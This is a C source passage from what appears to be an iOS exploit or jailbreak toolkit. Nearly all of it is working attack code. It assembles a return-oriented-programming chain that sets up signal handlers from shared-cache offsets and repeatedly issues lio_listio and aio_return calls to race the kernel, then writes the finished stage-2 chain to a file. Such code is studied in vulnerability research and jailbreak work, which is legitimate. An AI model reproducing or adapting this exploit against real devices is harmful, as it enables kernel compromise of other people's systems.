	DEFINE_ROP_VAR("aio_list2",NENT * 8,tmp);
	DEFINE_ROP_VAR("aios2",NENT * sizeof(struct aiocb),tmp);

	// block the signals the other racing threads use (we just block all and then unblock below)
	DEFINE_ROP_VAR("mysigmask3",sizeof(uint64_t),tmp);
	for (int i = 0; i < 4; i++) { 
		SET_ROP_VAR64("mysigmask3",(1 << (SIGWINCH-1+i)));
		ROP_VAR_ARG_HOW_MANY(1);
		ROP_VAR_ARG("mysigmask3",2);
		CALL("__pthread_sigmask",SIG_BLOCK,0,0,0,0,0,0,0);
	}

	DEFINE_ROP_VAR("signal_set2",sizeof(sigset_t),tmp);
	SET_ROP_VAR64("signal_set2",(1 << (SIGWINCH-1+1)));

	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("signal_set2",2);
	CALL("__pthread_sigmask",SIG_UNBLOCK,0,NULL,0,0,0,0,0);

	DEFINE_ROP_VAR("sigevent2",sizeof(struct sigevent),tmp);
	SET_ROP_VAR32_W_OFFSET("sigevent2",SIGEV_SIGNAL,offsetof(struct sigevent,sigev_notify));
	SET_ROP_VAR32_W_OFFSET("sigevent2",SIGWINCH+1,offsetof(struct sigevent,sigev_signo));

	struct __sigaction * myaction2 = malloc(sizeof(struct __sigaction));
	memset(myaction2,0,sizeof(struct __sigaction));
	myaction2->sa_handler = (void (*)(int)) offsets->rop_nop-0x180000000+offsets->new_cache_addr;
	myaction2->sa_tramp = (void (*)(void *, int, int, siginfo_t *, void *)) get_addr_from_name(offsets,"_sigtramp")-0x180000000+offsets->new_cache_addr;
	myaction2->sa_mask = (1 << (SIGWINCH-1+1));
	DEFINE_ROP_VAR("my_action2",sizeof(struct __sigaction),myaction2);
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("my_action2",2);
	CALL("__sigaction",SIGWINCH+1,0,0,0,0,0,0,0);

	for (uint32_t i = 0; i < NENT; i++) {
		int offset = sizeof(struct aiocb) * i;
		ROP_VAR_CPY_W_OFFSET("aios",offset + offsetof(struct aiocb,aio_fildes),"racer_fd2",0,4);
		SET_ROP_VAR64_W_OFFSET("aios2",0,offset + offsetof(struct aiocb,aio_offset)); 
		SET_ROP_VAR64_TO_VAR_W_OFFSET("aios2",offset+offsetof(struct aiocb,aio_buf),"aio_buf",i);
		SET_ROP_VAR64_W_OFFSET("aios2",1,offset + offsetof(struct aiocb,aio_nbytes));
		SET_ROP_VAR32_W_OFFSET("aios2",LIO_READ,offset + offsetof(struct aiocb,aio_lio_opcode)); 
		SET_ROP_VAR32_W_OFFSET("aios2",SIGEV_NONE,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify));

		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list2",i*8,"aios2",offset);
	}

	// TODO: optimize this (we don't need the aio_return value do we)
	ADD_LOOP_START("racer_loop2");
		for (int i = 0; i<64;i++) {
			ROP_VAR_ARG_HOW_MANY(2);
			ROP_VAR_ARG("aio_list2",2);
			ROP_VAR_ARG("sigevent2",4);
			CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
		}
		ROP_VAR_ARG_HOW_MANY(1);
		ROP_VAR_ARG64("reply_port",5); 
		CALL("mach_msg",0,MACH_RCV_MSG | MACH_RCV_INTERRUPT | MACH_RCV_TIMEOUT,0,0,0 /*recv port*/, 1, MACH_PORT_NULL,0);
		
		for (int i = 0; i < NENT; i++) {
			ROP_VAR_ARG_HOW_MANY(1);
			ROP_VAR_ARG64_W_OFFSET("aio_list2",1,i*8);
			CALL("aio_return",0,0,0,0,0,0,0,0);
		}

		// set x0 
		SET_X0_FROM_ROP_VAR("should_race");
		// break out of the loop if x0 is nonzero
		ADD_LOOP_BREAK_IF_X0_NONZERO("racer_loop2");
	ADD_LOOP_END();
	
	// this thread wasn't spawned using pthread so we can't easily exit...
	ADD_LOOP_START("endless_thread_loop");
		ADD_USLEEP(10000000);
	ADD_LOOP_END();

#endif

	if (curr_rop_var != NULL) {
		build_databuffer(offsets,rop_var_top);
	}
#ifdef DEBUG
	build_chain_DBG(offsets,rop_var_top);
#endif
	char path[1024];
	snprintf(path,sizeof(path),"%s/stg2",base_dir);
	int fd = open(path,O_WRONLY | O_CREAT, 0644);
	build_chain(fd,offsets,rop_var_top);
}
